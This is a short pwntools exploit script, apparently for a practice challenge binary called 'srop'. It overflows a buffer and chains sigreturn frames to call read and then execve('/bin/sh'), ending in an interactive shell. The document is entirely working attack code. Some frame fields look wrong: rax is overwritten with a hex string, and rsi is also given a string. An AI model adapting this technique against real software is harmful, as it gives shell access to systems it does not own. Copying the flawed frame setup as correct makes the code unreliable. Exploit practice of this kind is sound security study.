from pwn import *

# amd64 cpu 아키텍처 명시
context.clear(arch='amd64')

e=ELF("./srop")
p=process("./srop")

#
_bss=e.bss()

# pop rax; syscall
gadget = 0x40052a
# syscall
syscall = 0x40052b
binsh = "/bin/sh\x00"

read_got = e.got['read']
_start = e.symbols['_start']

frame = SigreturnFrame()

# read (0, 0x601038, 0x1000)
frame.rax = 0
frame.rsi = hex(_bss+0x8)
frame.rdx = 0x1000
frame.rdi = 0
frame.rip = syscall
frame.rax = hex(_bss)

payload="A"*16
payload+="B"*8
payload+=p64(gadget)
payload+=p64(15) #sigreturn

payload += str(frame)

p.sendline(payload)

frame2 = SigreturnFrame()
frame2.rip = syscall
frame2.rax = 0x3b #execve
frame2.rsp = 0x601500
frame2.rdi = 0x601310
rop=p64(gadget)
rop+=p64(15)
rop+=str(frame2)
rop+="/bin/sh\x00"

p.sendline(rop)
p.interactive()
